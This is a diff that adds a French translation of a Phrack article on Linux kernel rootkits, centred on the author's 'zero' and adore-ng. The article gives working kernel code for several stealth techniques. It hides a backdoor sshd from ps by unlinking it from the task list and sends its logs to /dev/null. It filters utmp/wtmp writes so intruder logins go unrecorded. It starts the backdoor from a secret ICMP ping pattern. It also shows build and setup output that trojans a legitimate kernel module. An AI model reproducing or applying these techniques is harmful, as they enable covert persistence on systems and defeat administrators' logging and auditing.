@@ -1,0 +1,319 @@
+                           ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3d, Phile 0x0e of 0x0f
+
+|=-----------------------------------------------------------------------=|
+|=------------------=[ Kernel Rootkit Experiences ]=---------------------=|
+|=--------------=[Traduit par dicagem[degenere-science]=-----------------=|
+|=----------------=[ stealth <stealth@segfault.net> ]=-------------------=|
+
+
+--[ Contenu
+
+1 - Introduction
+
+2 - Sick of it all?
+
+3 - Let it log
+
+4 - Let it rock
+
+5 - Thinking about linking
+
+6 - as in 2.6
+
+7 - Last words & References
+
+
+--[ 1 - Introduction
+
+Cet article se focalise sur les rootkits noyaux et comment ils seront
+influencés pas les backdoors dite "normales" dans le futur. Les rootkits
+noyaux sont présents depuis quelques temps, et ils le seront encore dans le
+futur, ainsi quelques idées et perspectives vaudront le coup.
+  Avant de lire cet article, vous devriez lire les articles sur les hooks
+netfilter et le relink de lkm. L'implémentation de la backdoor dont je parle
+et certains bouts de code se baseront dessus.
+  Ne prenez pas trop cet article au sérieux, si on lit entre les lignes, on
+se rend compte que ce n'est pas un tutorial de piratage. Je dis juste que
+j'ai de l'expérience en tant "qu'auteur d'adore" ces dernières années. Cela
+sera destiné aux admins vexés dans les conférences, questions idiotes lors
+de discours, mails d'appel à l'aide, messages du genre "adore sucks" sur
+IRC, remerciements de sites en .edu etc.
+
+--[ 2 - Sick of it all?
+
+Les rootkits, et les rootkits noyaux en particulier, sont disponibles
+depuis quelques années maintenant, et quelques recherches ont été effectués
+la dessus. Beaucoup de chialeurs et encore plus de baratineurs se font 
+publier de temps à autre, mais ils sont peu intéressants et je vous 
+comprenderais si vous ne lisez pas plus d'articles à propos des rootkits. 
+Cependant, de nouveaux obstacles sont apparus et les auteurs de rootkit 
+doivent s'y interesser. Cela inclut de manière non exhaustive
+
+-nouvelles versions de noyaux et extensions propri‚taires
+-absence de symboles importants (… savoir sys_call_table)
+-logging avancé et mécanismes d'audits
+-durcissement du noyau, OS sécurisé etc
+-détection d'intrusion/détection de comportement anormal
+-outils avancés de "forensic" et méthodes d'analyse
+
+Pendant que je m'occupe de certains de ces points dans adore-ng,par exemple
+comme éviter l'utilisation de sys_call_table[] par la redirection du la
+couche VFS, quelques points sont encore des sujets de recherche. Les
+rootkits incluent habituellement des log-cleaners pour les fichiers
+[u,w]tmp, mais cela coince avec la règle du "moindre privilège" du pirate,
+qui se transforme en "moindre upload vers le système". Donc, un point est
+d'essayer d'éviter tout log, au niveau de la backdoor (niveau LKM dans
+notre cas) pour avoir le minimum de binaires sur le système cible.
+Les choses sur les systèmes "surs" devront être expliquées dans un article
+à part, et je sais déja quel partie du kernel je vais regarder chez
+spender.
+
+-[ 3 Let it log
+
+Durant un discours à propos de rootkits dans une certaine université par
+une société d'analyse, j'ai eu quelques idées sympatiques qui pourraient
+améliorer l'invisibilité.
+  Aujourd'hui, les mecs maitrisants ne patch probablement plus de binaire
+de sshd, mais placent des systèmes d'authentification à certains endroits
+(oui, des mécanismes d'authentification distribués peuvent être mauvais
+pour les analyseurs).
+Donc, un intrus qui va utiliser des outils standards (il peut aussi
+installer ultérieurement des librairies et paquetages si ceux-la manquent;
+sais-tu lequel des 3 admins a installé le paquetage openssh sur le pc-5073
+?) le rootkit LKM a d'une façon ou d'une autre à s'assurer que les logs de
+sshd partent vers /dev/null. On peut le faire comme ça :
+
+
+static int ssh(void *vp)
+{
+char *a[] = {"/usr/bin/perl", "-e",
+"$ENV{PATH}='/usr/bin:/bin:/sbin:/usr/sbin';"
+"open(STDIN,'</dev/null');open(STDOUT,'>/dev/null');"
+"open(STDERR,'>/dev/null');"
+"exec('sshd -e -d -p 2222');",
+NULL};
+
+task_lock(current);
+REMOVE_LINKS(current);
+list_del(&current->thread_group);
+evil_sshd_pid = current->pid;
+task_unlock(current);
+exec_usermodehelper(*a, a, NULL);
+return 0;
+
+}
+
+
+Cela ressemble … ce qui pourrait s'appeler un kernel_thread() par un hook
+netfilter, hein ? "-e" fait logger sshd vers stderr qui est /dev/null dans
+notre cas. Excellent. "-d" est un argument sympa qui empèche sshd de fork
+et donc il n'y pas pas de ports ouverts qui pourraient être détectés après
+le login de l'intrus. REMOVE_LINK() permet au process d'etre invisible face
+à ps et ses amis. Utiliser perl est n‚cessaire pour ouvrir stdin etc car
+exec_usermodehelper() va fermer tous les fichiers avant de lancer sshd qui
+fait faire confondre … sshd stderr avec la socket quand il est lancé
+avec -e. Le log de utmp/wtmp/lastlog peut être empèché grâce à:
+
+// parent must be evil sshd (since child which becomes the shell
+// logs the stuff)
+if (current->p_opptr &&
+current->p_opptr->pid == evil_sshd_pid && evil_sshd_pid != 0) {
+for (i = 0; var_filenames[i]; ++i) {
+if (var_files[i] && f->f_dentry->d_inode->i_ino ==
+var_files[i]->f_dentry->d_inode->i_ino) {
+task_unlock(current);
+*off += blen;
+return blen;
+}
+}
+}
+
+Cela fait comme si le logu‚ est sshd et qu'il essayait d'écrire dans des
+entrées dans [u,w]tmp dans les fichiers appropriés. Bien sur nous devons
+rediriger la fonction write() dans la couche VFS et vérifier les numéros
+inode pour filtrer les bonnes écritures. En effet, nous devons vérifier
+le superblock aussi, mais sshd ne vas pas écrire des fichiers avec le même
+inode sur un disque différent je pense. Certains modules pam ouvrent une
+session quand quelqu'un se logge, donc un
+
+  pam_unix2: session started for user root
+
+pourrait apparaitre dans le log même avec le sshd modifié avec la
+redirection de log. Ainsi, le problème du log pourrait être résolu dans les
+futurs backdoors/rootkits sans mettre la pagaille dans les binaires du
+système.
+
+--[ 4 Let it rock
+
+
+Celui-ci a besoin d'un argument pour faire démarrer le sshd modifié, donc
+nmap ne montre pas de ports ouverts. Bien sur. L'article sur netfilter
+montre comment on peut construire ses propres hooks icmp pour cela. Je ne
+vais pas décrire cela ici, l'article le fait mieux que je ne le pourrais.
+Juste un point important: d'après mon expérience, vous ne pouvez pas
+d‚marrer un programme dans le hook directement. Le noyau va crasher,
+probablement parce que le hook a, d'une manière ou d'une autre, interfèré
+avec une routine de service interrompu. Pour venir à bout de ce problème,
+nous fixons un flag pour que le sshd d‚marre:
+
+if (hit && (hit-1) % HIT_FREQ == 0) {
+write_lock(&ssh_lock);
+start_ssh = 1;
+write_unlock(&ssh_lock);
+return NF_DROP;
+}
+
+et puisque nous interférons avec la couche VFS dans tous les cas, nous
+redirigeons aussi l'appel d' open() (du FS particulier que /etc contient)
+donc le prochain processus qui ouvre un fichier sur le même FS qui démarre
+le sshd modifié. Cela pourrait être un "ls" du root, ou que nous
+déclenchons par nous-mêmes, via le vrai sshd qui tourne:
+
+root@linux:root# telnet 127.0.0.1 22
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+SSH-2.0-OpenSSH_3.5p1
+SSH-2.0-OpenSSH_3.5p1 <<<<< copi‚ par l'attaquant
+Connection closed by foreign host.
+
+Sur ma machine cela donne un log du vrai sshd:
+
+sshd[1967]: fatal: No supported key exchange algorithms
+
+Si quelqu'un n'entre pas une chaine de caractères, il aura son IP logg‚e:
+
+sshd[1980]: Bad protocol version identification '' from ::ffff:127.0.0.1
+
+Il peut y avoir d'autres services (sans logs) qui ouvrent des fichiers et
+execute le démarrage du sshd modifié comme un httpd. Il est facile de voir
+si c'est possible pour le rootkit noyau de supprimer certains messages de
+log mais pour le moment cela dépend de l'application et de la connaissance
+de la façon dont cela est loggé. Ce ne serait pas une mauvaise supposition
+de penser pour un intrus, mais les futurs intrus pourront utiliser des
+systèmes d'infection (infecter tous les logs/données qui sont causées par
+un shell caché par exemple) pour effacer tous les logs qu'un admin pourrait
+trouver utile pour détecter un intrus.
+
+
+
+--[ 5 Thinking about linking
+
+Voila un article sur le LKM infection, merci de le lire, il vaut le coup
+d'y passer le temps. Pourtant, on ne doit pas trop bidouiller avec avec le
+format ELF, un simple mmap() avec une substitution du init_module() et du
+cleanup_module() suffira. Un tel programme devrait faire partie d'un
+rootkit, car les rootkits doivent être facile à utiliser, donc ils peuvent
+être facilement installés par des admins qui installent des honeypots:
+
+root@linux:zero# ./configure
+Starting configuration ...
+generating secret pattern ...
+\\x37\\x8e\\x37\\x5f
+checking 4 SMP ... NO
+checking 4 MODVERSIONS ...NO
+
+Votre commande ping secrète : ping -s 32 -p 378e375f IP
+
+root@linux:zero# make
+cc -c -I/usr/src/linux/include -DSECRET_PATTERN=\"\\x37\\x8e\\x37\\x5f\"\
+-O2 -Wall zero.c
+cc -c -I/usr/src/linux/include -DSECRET_PATTERN=\"\\x37\\x8e\\x37\\x5f\"\
+-O2 -Wall -DSTANDALONE zero.c -o zero-alone.o
+cc -c -I/usr/src/linux/include -DSECRET_PATTERN=\"\\x37\\x8e\\x37\\x5f\"\
+-O2 -Wall cleaner.c
+root@linux:zero# ./setup
+Les LKM suivants sont disponibles :
+
+
+af_packet ppp_async ppp_generic slhc iptable_filter
+ip_tables ipv6 st sr_mod sg
+mousedev joydev evdev input uhci
+usbcore raw1394 ieee1394 8139too mii
+scsi cd cdrom parport_pc ppa
+
+Chose one: sg
+Choice was >>>sg<<<
+Searching for sg.o ...
+Found /lib/modules/2.4.20/kernel/drivers/scsi/sg.o!
+
+Copy trojaned LKM back to original LKM? (y/n)
+
+...
+
+zero.o sert au relinkage avec un des modules choisi, mais dès qu'il
+est inséré dans le noyau, l'intrus a besoin d'un seul module:
+zero-alone.o.
+Pour plus d'idées sur le linking et des approches sur des plate-formes
+différentes, veuillez lire l'article [1].
+
+--[ 6 as in 2.6
+
+Au moment de l'écriture de l'article, le noyau Linux 2.6 était encore
+en phase de tests, et sera bientôt disponible en version stable.
+Donc, il est probablement temps de regarder les nouveaux bugs.
+Au [4], vous trouverez une version d'adore-ng qui marche déja avec le 2.6.
+En plus des quelques nouveaux headers dont le rootkit aura besoin, les
+signatures de quelques fonctions vont être modifiées. Une chose pas
+inhabituelle. Pas trop difficile. En particulier la fonction init et
+cleanup doit être annoncée au lanceur de LKM d'une façon différente:
+
+#ifdef LINUX26
+static int __init adore_init()
+#else
+int init_module()
+#endif
+
+et
+
+static void __exit adore_cleanup()
+#else
+int cleanup_module()
+#endif
+
+
+...
+
+#ifdef LINUX26
+module_init(adore_init);
+module_exit(adore_cleanup);
+#endif
+
+Pas de grosses différences. Adore-ng utilise déja la nouvelle technique VFS
+pour cacher les fichiers et les processus, donc nous n'avons pas à nous
+occuper de la couche sys_call_table. La partie qui prend la plus de temps
+pour portel adore sur le noyau 2.6 est de trouver comment les LKM sont
+batis. Cela ne suffit plus de les "cc" comme un simple ficher objet. On
+doit les relier avec d'autres fichiers objets compilés avec un fichier C
+contenant certaines informations et attributs comme
+
+MODULE_INFO(vermagic, VERMAGIC_STRING);
+
+par exemple. Je ne sais pas pourquoi ils dépendent de cela.
+Et c'est tout pour le 2.6 ! Pas magique du tout, excepté quelques hooks
+introduits dans le noyau qui mériteraient un coup d'oeil.
+
+--[ 7 Last words & references
+
+Le rootkit zero ne cache pas de fichiers, et il cache uniquement le
+processus sshd modifi‚ en l'enlevant de la liste des taches. Ce n'est pas
+judicieux de stopper le système depuis un processus ou son fils. J'ai testé
+zero sur un système SMP mais il a gelé.
+Peu importe que cela vienne de mon code ou de l'option -f de insmod que
+j'ai du utiliser à cause d'une différence de version. Si quelqu'un peut
+me donner (légalement bien sur !) accès à une box SMP, contactez la team de
+phrack ou moi même. Zero est expériemental, donc merci de ne pas me dire
+que vous ne l'aimez pas car il manque une interface graphique ou autre
+chose.
+
+Quelques liens:
+
+[1] Infecting Loadable Kernel Modules (in this release)
+[2] Hacking da Linux Kernel Network Stack (in this release)
+[3] http://stealth.7350.org/empty/zero.tgz
+(soon appears at http://stealth.7350.org/rootkits)
+[4] http://stealth.7350.org/rootkits/adore-ng-0.24.tgz
+
+|=[ EOF ]=---------------------------------------------------------------=|
